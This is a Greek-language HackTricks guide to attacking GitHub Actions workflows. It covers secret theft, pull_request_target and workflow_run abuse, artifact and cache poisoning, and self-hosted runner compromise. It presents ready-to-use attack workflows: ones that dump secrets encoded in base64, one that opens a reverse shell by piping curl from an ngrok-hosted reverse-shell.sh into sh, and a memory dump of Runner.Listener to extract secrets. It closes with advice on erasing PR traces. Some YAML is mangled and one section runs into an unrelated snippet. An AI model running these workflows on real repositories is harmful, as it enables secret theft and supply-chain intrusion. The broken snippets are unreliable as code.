# Κατάχρηση των Github Actions

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Σε αυτήν τη σελίδα θα βρείτε:

* Ένα **σύνολο των επιπτώσεων** όταν ένας επιτιθέμενος καταφέρνει να έχει πρόσβαση σε μια Github Action
* Διάφορους τρόπους για να **αποκτήσετε πρόσβαση σε μια action**:
* Έχοντας **δικαιώματα** για να δημιουργήσετε την action
* Κατάχρηση **συναφών triggers** με τα pull request
* Κατάχρηση **άλλων εξωτερικών τεχνικών πρόσβασης**
* **Περιστροφή** από ένα ήδη παραβιασμένο αποθετήριο
* Τέλος, μια ενότητα για **τεχνικές μετά-εκμετάλλευσης για την κατάχρηση μιας action από μέσα** (λόγω των προαναφερθέντων επιπτώσεων)

## Σύνοψη Επιπτώσεων

Για μια εισαγωγή σχετικά με τις [**Github Actions ελέγξτε τις βασικές πληροφορίες**](../basic-github-information.md#github-actions).

Σε περίπτωση που μπορείτε να **εκτελέσετε αυθαίρετες Github actions/εισάγετε κώδικα** σε ένα **αποθετήριο**, μπορείτε να:

* **Κλέψετε** τα **μυστικά** από αυτό το αποθετήριο/οργανισμό.
* Εάν μπορείτε μόνο να εισάγετε κώδικα, μπορείτε να κλέψετε οτιδήποτε ήδη υπάρχει στη ροή εργασίας.
* Κατάχρηση των **δικαιωμάτων του αποθετηρίου** για πρόσβαση σε άλλες πλατφόρμες όπως AWS και GCP.
* **Εκτέλεση κώδικα σε προσαρμοσμένους εργαζομένους** (εάν χρησιμοποιούνται προσαρμοσμένοι εργαζόμενοι) και προσπαθήστε να περιστραφείτε από εκεί.
* **Αντικαταστήστε** τον **κώδικα** του αποθετηρίου.
* Αυτό εξαρτάται από τα δικαιώματα του `GITHUB_TOKEN` (εάν υπάρχουν).
* **Παραβίαση** **αναπτύξεων** και άλλων **αρχείων**.
* Εάν ο κώδικας αναπτύσσει ή αποθηκεύει κάτι, μπορείτε να το τροποποιήσετε και να αποκτήσετε περαιτέρω πρόσβαση.

## GITHUB\_TOKEN

Αυτό το "**μυστικό**" (προέρχεται από `${{ secrets.GITHUB_TOKEN }}` και `${{ github.token }}`) δίνεται όταν ο διαχειριστής ενεργοποιεί αυτήν την επιλογή:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Αυτό το διακριτικό είναι το ίδιο που θα χρησιμοποιήσει μια **Εφαρμογή Github**, έτσι ώστε να μπορεί να έχει πρόσβαση στα ίδια σημεία εντατικότητας: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Ο Github θα πρέπει να κυκλοφορήσει ένα [**ροή**](https://github.com/github/roadmap/issues/74) που επιτρέπει **διασυνοριακή** πρόσβαση εντός του GitHub, έτσι ώστε ένα αποθετήριο να μπορεί να έχει πρόσβαση σε άλλα εσωτερικά αποθετήρια χρησιμοποιώντας το `GITHUB_TOKEN`.
{% endhint %}

Μπορείτε να δείτε τα πιθανά **δικαιώματα** αυτού του διακριτικού στο: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Σημειώστε ότι το διακριτικό **λήγει μετά την ολοκλήρωση της εργασίας**.\
Αυτά τα διακριτικά φαίνονται κάπως έτσι: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Ορισμένα ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό το διακριτικό:

{% tabs %}
{% tab title="Συγχώνευση PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Έγκριση PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Δημιουργία PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Σημείωση ότι σε πολλές περιπτώσεις θα μπορείτε να βρείτε **github user tokens μέσα στα Github Actions envs ή στα secrets**. Αυτά τα tokens μπορεί να σας δώσουν περισσότερα προνόμια στο αποθετήριο και τον οργανισμό.
{% endhint %}

<details>

<summary>Λίστα μυστικών στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Λάβετε αντίστροφο κέλυφος με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατόν να ελέγξετε τα δικαιώματα που έχει δοθεί σε ένα Github Token σε αποθετήρια άλλων χρηστών **ελέγχοντας τα logs** των ενεργειών:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπόμενη Εκτέλεση

{% hint style="info" %}
Αυτό θα ήταν ο ευκολότερος τρόπος να παραβιάσετε τις ενέργειες του Github, καθώς αυτή η περίπτωση υποθέτει ότι έχετε πρόσβαση για να **δημιουργήσετε ένα νέο αποθετήριο στον οργανισμό**, ή έχετε **δικαιώματα εγγραφής σε ένα αποθετήριο**.

Αν βρίσκεστε σε αυτό το σενάριο, μπορείτε απλά να ελέγξετε τις [τεχνικές μετά-εκμετάλλευσης](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Εκτέλεση από Δημιουργία Αποθετηρίου

Στην περίπτωση που τα μέλη ενός οργανισμού μπορούν να **δημιουργήσουν νέα αποθετήρια** και μπορείτε να εκτελέσετε github actions, μπορείτε να **δημιουργήσετε ένα νέο αποθετήριο και να κλέψετε τα μυστικά που έχουν οριστεί σε επίπεδο οργανισμού**.

### Εκτέλεση από Νέο Κλαδί

Αν μπορείτε να **δημιουργήσετε ένα νέο κλαδί σε ένα αποθετήριο που ήδη περιέχει μια διαμόρφωση του Github Action**, μπορείτε να το **τροποποιήσετε**, να **ανεβάσετε** το περιεχόμενο και στη συνέχεια να **εκτελέσετε αυτήν την ενέργεια από το νέο κλαδί**. Με αυτόν τον τρόπο μπορείτε να **αποκτήσετε πρόσβαση σε μυστικά του αποθετηρίου και του οργανισμού** (αλλά πρέπει να ξέρετε πώς ονομάζονται).

Μπορείτε να κάνετε την τροποποιημένη ενέργεια εκτελέσιμη **χειροκίνητα**, όταν δημιουργείται ένας **Αίτημα Προσέλευσης (PR)** ή όταν **ανεβάζεται κώδικας** (ανάλογα με το πόσο θορυβώδης θέλετε να είστε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Εκτέλεση με διακλάδωση

{% hint style="info" %}
Υπάρχουν διάφορες ενέργειες που μπορούν να επιτρέψουν σε έναν επιτιθέμενο να **εκτελέσει μια ενέργεια του Github από ένα άλλο αποθετήριο**. Εάν αυτές οι ενεργοποιήσιμες ενέργειες έχουν κακή διαμόρφωση, ένας επιτιθέμενος μπορεί να τις απειλήσει.
{% endhint %}

### `pull_request`

Η ενέργεια εκκίνησης ροής εργασίας **`pull_request`** θα εκτελεί τη ροή εργασίας κάθε φορά που λαμβάνεται ένα αίτημα ενσωμάτωσης με κάποιες εξαιρέσεις: από προεπιλογή, εάν είναι η **πρώτη φορά** που συνεργάζεστε, κάποιος **διαχειριστής** θα πρέπει να **εγκρίνει** την **εκτέλεση** της ροής εργασίας:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Καθώς ο περιορισμός προεπιλογής είναι για συνεισφέροντες πρώτης φοράς, μπορείτε να συνεισφέρετε **διορθώνοντας ένα έγκυρο σφάλμα/τυπογραφικό λάθος** και στη συνέχεια να στείλετε **άλλα αιτήματα ενσωμάτωσης για να καταχραστείτε τα νέα προνόμια του `pull_request`**.

**Το δοκίμασα και δεν λειτουργεί**: ~~Μια άλλη επιλογή θα ήταν να δημιουργήσετε έναν λογαριασμό με το όνομα κάποιου που συνεισέφερε στο έργο και διέγραψε τον λογαριασμό του.~~
{% endhint %}

Επιπλέον, από προεπιλογή **αποτρέπει τις άδειες εγγραφής** και την **πρόσβαση σε μυστικά** στον προορισμένο αποθετήριο, όπως αναφέρεται στα [**έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Εκτός από το `GITHUB_TOKEN`, **τα μυστικά δεν περνούν στον εκτελεστή** όταν μια ροή εργασίας ενεργοποιείται από ένα **διακλαδωμένο** αποθετήριο. Το **`GITHUB_TOKEN` έχει δικαιώματα μόνο για ανάγνωση** στα αιτήματα ενσωμάτωσης **από διακλαδωμένα αποθετήρια**.

Ένας επιτιθέμενος μπορεί να τροποποιήσει τον ορισμό της ενέργειας του Github για να εκτελέσει αυθαίρετα πράγματα και να προσθέσει αυθαίρετες ενέργειες. Ωστόσο, δεν θα μπορεί να κλέψει μυστικά ή να αντικαταστήσει το αποθετήριο λόγω των αναφερθέντων περιορισμών.

{% hint style="danger" %}
**Ναι, εάν ο επιτιθέμενος αλλάξει στο αίτημα ενσωμάτωσης την ενέργεια του github που θα ενεργοποιηθεί, η ενέργεια του Github που θα χρησιμοποιηθεί θα είναι αυτή που ορίζει ο επιτιθέμενος και όχι αυτή από το αρχικό αποθετήριο!**
{% endhint %}

Καθώς ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμη και αν δεν υπάρχουν μυστικά ή δικαιώματα εγγραφής στο `GITHUB_TOKEN`, ένας επιτιθέμενος μπορεί για παράδειγμα να **ανεβάσει κακόβουλα αντικείμενα**.

### **`pull_request_target`**

Η ενέργεια εκκίνησης ροής εργασίας **`pull_request_target`** έχει **δικαιώματα εγγραφής** στον προορισμένο αποθετήριο και **πρόσβαση σε μυστικά** (και δεν ζητά άδεια).

Σημειώστε ότι η ενέργεια εκκίνησης ροής εργασίας **`pull_request_target`** **εκτελείται στο βασικό περιβάλλον** και όχι στο περιβάλλον που δίνεται από το αίτημα ενσωμάτωσης (για να **μην εκτελεστεί μη αξιόπιστος κώδικας**). Για περισσότερες πληροφορίες σχετικά με το `pull_request_target` [**ελέγξτε τα έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτήν τη συγκεκριμένη επικίνδυνη χρήση, ελέγξτε αυτήν την [**ανάρτηση στο blog του github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή η **εκτελούμενη ροή εργασίας** είναι αυτή που ορίζεται στη **βάση** και όχι στο αίτημα ενσωμάτωσης, είναι **ασφαλές** να χρησιμοποιηθεί το **`pull_request_target`**, αλλά υπάρχουν **μερικές περιπτώσεις όπου δεν είναι**.

Και αυτή θα έχει **πρόσβαση σε μυστικά**.

### `workflow_run`

Η ενέργεια εκκίνησης ροής εργασίας [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) επιτρέπει την εκτέλεση μιας ροής εργασίας από μια διαφορετική ροή όταν είναι `ολοκληρωμένη`, `ζητημένη` ή `σε εξέλιξη`.

Σε αυτό το παράδειγμα, μια ροή εργασίας έχει διαμορφωθεί για να εκτελείται μετά την ολοκλήρωση της ξεχωριστής ροής "Εκτέλεση Δοκιμών":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Επιπλέον, σύμφωνα με τα έγγραφα: Η ροή εργασίας που ξεκινά από το γεγονός `workflow_run` είναι σε θέση να **έχει πρόσβαση σε μυστικά και να γράψει διακριτικά, ακόμη κι αν η προηγούμενη ροή εργασίας δεν ήταν**.

Αυτή η είδους ροή εργασίας μπορεί να επιτεθεί αν εξαρτάται από μια ροή εργασίας που μπορεί να ενεργοποιηθεί από έναν εξωτερικό χρήστη μέσω `pull_request` ή `pull_request_target`. Μερικά ευάλωτα παραδείγματα μπορούν να βρεθούν [**σε αυτό το ιστολόγιο**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Το πρώτο παράδειγμα αποτελείται από τη ροή εργασίας που ενεργοποιείται από το `workflow_run` και κατεβάζει τον κώδικα του επιτιθέμενου: `${{ github.event.pull_request.head.sha }}`\
Το δεύτερο παράδειγμα αποτελείται από την **παράδοση** ενός **αντικειμένου** από τον **μη αξιόπιστο** κώδικα στη ροή εργασίας `workflow_run` και τη χρήση του περιεχομένου αυτού του αντικειμένου με έναν τρόπο που το καθιστά ευάλωτο σε RCE.

### `workflow_call`

ΕΚΚΡΕΜΕΙ

ΕΚΚΡΕΜΕΙ: Ελέγξτε αν κατά την εκτέλεση από ένα `pull_request` ο κώδικας που χρησιμοποιείται/κατεβάζεται είναι αυτός από την προέλευση ή από το αντιγραφέα PR

## Κατάχρηση Εκτέλεσης Αντιγράφου

Έχουμε αναφέρει όλους τους τρόπους με τους οποίους ένας εξωτερικός επιτιθέμενος μπορεί να καταφέρει να εκτελέσει μια ροή εργασίας του github, τώρα ας ρίξουμε μια ματιά σε πώς αυτές οι εκτελέσεις, αν δεν έχουν σωστή ρύθμιση, μπορούν να καταχραστούν:

### Εκτέλεση μη αξιόπιστης ανάκτησης

Στην περίπτωση του `pull_request`, η ροή εργασίας θα εκτελεστεί στο πλαίσιο του PR (έτσι θα εκτελεστεί ο κακόβουλος κώδικας των PR), αλλά κάποιος πρέπει να το εξουσιοδοτήσει πρώτα και θα τρέξει με ορισμένους [περιορισμούς](./#pull\_request).

Στην περίπτωση μιας ροής εργασίας που χρησιμοποιεί `pull_request_target` ή `workflow_run` και εξαρτάται από μια ροή εργασίας που μπορεί να ενεργοποιηθεί από `pull_request_target` ή `pull_request`, ο κώδικας από το αρχικό αποθετήριο θα εκτελεστεί, οπότε ο επιτιθέμενος δεν μπορεί να ελέγξει τον εκτελούμενο κώδικα.

{% hint style="danger" %}
Ωστόσο, αν η **ενέργεια** έχει μια **συγκεκριμένη ανάκτηση PR** που θα **πάρει τον κώδικα από το PR** (και όχι από τη βάση), θα χρησιμοποιήσει τον κώδικα που ελέγχεται από τον επιτιθέμενο. Για παράδειγμα (ελέγξτε τη γραμμή 12 όπου κατεβάζεται ο κώδικας του PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># ΜΗ ΑΣΦΑΛΕΣ. Παρέχεται ως παράδειγμα μόνο.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Ο πιθανώς μη αξιόπιστος κώδικας εκτελείται κατά τη διάρκεια της `npm install` ή `npm build`, καθώς οι εντολές κατασκευής και οι αναφερόμενες **πακέτα ελέγχονται από τον συντάκτη του PR**.

{% hint style="warning" %}
Ένα github dork για την αναζήτηση ευάλωτων ενεργειών είναι: `event.pull_request pull_request_target extension:yml`, ωστόσο, υπάρχουν διάφοροι τρόποι για να ρυθμιστούν οι εργασίες που θα εκτελεστούν με ασφάλεια, ακόμη κι αν η ενέργεια έχει ρυθμιστεί με ανεπάρκεια (όπως η χρήση συνθηκών για τον δημιουργό του PR).
{% endhint %}

### Ενσωμάτωση Σεναρίων Εισαγωγής <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Σημειώστε ότι υπάρχουν ορισμένα [**πεδία περιβάλλοντος του github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) των οποίων οι τιμές ελέγχονται από τον χρήστη που δημιουργεί το PR. Αν η ενέργεια του github χρησιμοποιεί αυτά τα δεδομένα για να εκτελέσει οτιδήποτε, μπορεί να οδηγήσει σε αυθαίρετη εκτέλεση κώδικα:

{% content-ref
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτό μπορεί να επιτεθεί με αυτήν τη ροή εργασίας:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Άλλη Εξωτερική Πρόσβαση

### Κατάχρηση Διαγραμμένου Ονόματος Χώρου Αποθετηρίου

Εάν ένας λογαριασμός αλλάξει το όνομά του, ένας άλλος χρήστης μπορεί να καταχωρήσει έναν λογαριασμό με το ίδιο όνομα μετά από κάποιο χρονικό διάστημα. Εάν ένα αποθετήριο είχε **λιγότερα από 100 αστέρια πριν από την αλλαγή ονόματος**, το Github θα επιτρέψει στο νέο χρήστη με το ίδιο όνομα να δημιουργήσει ένα **αποθετήριο με το ίδιο όνομα** με αυτό που διαγράφηκε.

{% hint style="danger" %}
Έτσι, εάν μια ενέργεια χρησιμοποιεί ένα αποθετήριο από έναν μη υπάρχοντα λογαριασμό, είναι ακόμα δυνατόν ένας επιτιθέμενος να δημιουργήσει αυτόν τον λογαριασμό και να διακινδυνεύσει την ενέργεια.
{% endhint %}

Εάν άλλα αποθετήρια χρησιμοποιούν **εξαρτήσεις από αυτά τα αποθετήρια του χρήστη**, ένας επιτιθέμενος θα μπορεί να τα καταλάβει. Εδώ έχετε μια πιο πλήρη εξήγηση: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Αλλαγή Αποθετηρίου

{% hint style="info" %}
Σε αυτήν την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέπουν την **αλλαγή από ένα αποθετήριο σε ένα άλλο**, υποθέτοντας ότι έχουμε κάποια μορφή πρόσβασης στο πρώτο (ελέγξτε την προηγούμενη ενότητα).
{% endhint %}

### Δηλητηρίαση Προσωρινής Αποθήκευσης

Μια προσωρινή αποθήκευση διατηρείται μεταξύ **εκτελέσεων ροής εργασίας στον ίδιο κλαδί**. Αυτό σημαίνει ότι εάν ένας επιτιθέμενος **διακινδυνεύσει** ένα **πακέτο** που στη συνέχεια αποθηκεύεται στην προσωρινή αποθήκευση και **λήψη** και εκτέλεση από μια **πιο προνομιούχα** ροή εργασίας, θα μπορεί επίσης να **διακινδυνεύσει** αυτήν τη ροή εργασίας.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Δηλητηρίαση Αντικειμένου

Οι ροές εργασίας μπορούν να χρησιμοποιούν **αντικείμενα από άλλες ροές εργασίας και ακόμα και αποθετήρια**, εάν ένας επιτιθέμενος καταφέρει να **διακινδυνεύσει** την Github Action που **ανεβάζει ένα αντικείμενο** που χρησιμοποιείται αργότερα από μια άλλη ροή εργασίας, μπορεί να **διακινδυνεύσει τις άλλες ροές εργασίας**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Μετά την Εκμετάλλευση από μια Ενέργεια

### Πρόσβαση σε AWS και GCP μέσω OIDC

Ελέγξτε τις παρακάτω σελίδες:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Πρόσβαση σε μυστικά <a href="#accessing-secrets" id="accessing-secrets"></a>

Εάν εισάγετε περιεχόμενο σε ένα σενάριο, είναι ενδιαφέρον να γνωρίζετε πώς μπορείτε να έχετε πρόσβαση σε μυστικά:

* Εάν το μυστικό ή το διακριτικό έχει οριστεί ως **μεταβλητή περιβάλλοντος**, μπορεί να αποκτηθεί απευθείας μέσω του περιβάλλοντος χρησιμοποιώντας το **`printenv`**.

<details>

<summary>Λίστα μυστικών στην έξοδο της Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Λάβετε αντίστροφο κέλυφος με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Εάν το μυστικό χρησιμοποιείται **απευθείας σε μια έκφραση**, το δημιουργημένο shell script αποθηκεύεται **στον δίσκο** και είναι προσβάσιμο.
* ```bash
cat /home/runner/work/_temp/*
```
* Για μια ενέργεια JavaScript, τα μυστικά αποστέλλονται μέσω μεταβλητών περιβάλλοντος
* ```bash
ps axe | grep node
```
* Για μια **προσαρμοσμένη ενέργεια**, ο κίνδυνος μπορεί να ποικίλει ανάλογα με τον τρόπο που ένα πρόγραμμα χρησιμοποιεί το μυστικό που έχει λάβει από το **όρισμα**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Κατάχρηση των Self-hosted runners

Ο τρόπος για να βρείτε ποιες **Github Actions εκτελούνται σε μη-κατασκευής υποδομή του Github** είναι να αναζητήσετε το **`runs-on: self-hosted`** στο αρχείο ρυθμίσεων yaml της Github Action.

Οι self-hosted runners μπορεί να έχουν πρόσβαση σε **εξαιρετικά ευαίσθητες πληροφορίες**, σε άλλα **δίκτυα** (ευάλωτα σημεία στο δίκτυο; υπηρεσία μεταδεδομένων;) ή, ακόμα και αν είναι απομονωμένο και καταστρέφεται, **περισσότερες από μία ενέργειες μπορεί να εκτελούνται ταυτόχρονα** και η κακόβουλη μπορεί να **κλέψει τα μυστικά** της άλλης.

Στους self-hosted runners είναι επίσης δυνατό να αποκτηθούν τα **μυστικά από τη διεργασία _Runner.Listener_** η οποία θα περιέχει όλα τα μυστικά των ροών εργασίας σε οποιοδήποτε βήμα ανατρέχοντας τη μνήμη της:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Ελέγξτε [**αυτήν την ανάρτηση για περισσότερες πληροφορίες**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Καταχώρηση Docker εικόνων στο Github

Είναι δυνατόν να δημιουργήσετε Github actions που θα **κατασκευάζουν και αποθηκεύουν μια Docker εικόνα μέσα στο Github**.\
Ένα παράδειγμα μπορεί να βρεθεί στο παρακάτω αναπτυσσόμενο:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως μπορείτε να δείτε στον προηγούμενο κώδικα, το αποθετήριο του Github φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με δικαιώματα ανάγνωσης στο αποθετήριο θα μπορεί να κατεβάσει την εικόνα Docker χρησιμοποιώντας ένα προσωπικό access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Στη συνέχεια, ο χρήστης μπορεί να αναζητήσει **διαρροές μυστικών στα επίπεδα του Docker image:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Ευαίσθητες πληροφορίες στα αρχεία καταγραφής των Github Actions

Ακόμα κι αν το **Github** προσπαθεί να **ανιχνεύσει τις μυστικές τιμές** στα αρχεία καταγραφής των ενεργειών και να **αποφύγει να τις εμφανίσει**, **άλλα ευαίσθητα δεδομένα** που μπορεί να έχουν παραχθεί κατά την εκτέλεση της ενέργειας δεν θα κρυφτούν. Για παράδειγμα, ένα JWT που έχει υπογραφεί με μια μυστική τιμή δεν θα κρυφτεί εκτός αν έχει [ρυθμιστεί ειδικά](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Κάλυψη των ίχνων σας

(Τεχνική από [**εδώ**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Καταρχάς, οποιαδήποτε αίτηση ενσωμάτωσης (PR) που υποβάλλεται είναι ορατή στο κοινό στο Github και στον στόχο λογαριασμό του GitHub. Στο GitHub από προεπιλογή, **δεν μπορούμε να διαγράψουμε μια PR από το διαδίκτυο**, αλλά υπάρχει μια παρακαμπτήρια λύση. Για τους λογαριασμούς του Github που έχουν **τεθεί σε αναστολή** από το Github, όλες οι **PR διαγράφονται αυτόματα** και αφαιρούνται από το διαδίκτυο. Έτσι, για να κρύψετε τη δραστηριότητά σας, πρέπει είτε να **τεθεί σε αναστολή ο λογαριασμός σας στο GitHub είτε να σημαδευτεί ο λογαριασμός σας**. Αυτό θα **κρύψει όλες τις δραστηριότητές σας** στο GitHub από το διαδίκτυο (βασικά θα αφαιρέσει όλες τις εκμεταλλεύσεις PR σας)

